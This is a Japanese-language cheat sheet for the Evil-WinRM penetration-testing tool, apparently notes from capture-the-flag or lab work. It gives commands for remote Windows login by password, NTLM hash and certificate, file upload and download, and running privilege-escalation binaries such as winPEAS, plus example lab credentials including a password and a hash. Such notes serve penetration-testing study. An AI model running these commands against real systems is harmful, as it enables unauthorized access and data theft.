# ログイン方法
- **パスワードでログイン**
  ```bash
  evil-winrm -i <IP> -u user -p pass
  evil-winrm -i <IP> -u user -p pass -S
  ```

- **ハッシュでログイン**
  ```bash
  evil-winrm -i <IP> -u user -H ntlmhash
  ```

- **キーでログイン**

  ```bash
  evil-winrm -i <IP> -c certificate.pem -k priv-key.pem -S
  ```

### ログの表示

- **ログ表示**

  ```bash
  evil-winrm -i <IP> -u user -p pass -l
  ```

### ファイルのアップロードとダウンロード

- **ファイルのアップロード**

  ```bash
  upload <file>
  ```

- **ファイルのダウンロード**

  ```bash
  download <file> <filepath-kali>
  ```

- **Kaliから直接ファイルを読み込む**

  ```bash
  evil-winrm -i <IP> -u user -p pass -s /opt/privsc/powershell
  ```

### Evil-WinRMコマンド

- **コマンドメニューの表示**

  ```bash
  menu
  ```

- **バイナリの実行**

  ```bash
  evil-winrm -i <IP> -u user -p pass -e /opt/privsc
  Invoke-Binary /opt/privsc/winPEASx64.exe
  ```


- **パスワードログイン例**

  ```bash
  evil-winrm -i 10.10.11.14 -u maya -p 'm4y4ngs4ri'
  ```

  ![Password Login](https://github.com/user-attachments/assets/7020f363-a6ca-46b9-9f53-37b00809c45a)

- **ハッシュ値によるログイン例**

  ```bash
  evil-winrm -i 10.10.11.14 -u localadmin -H 9aa582783780d1546d62f2d102daefae
  ```
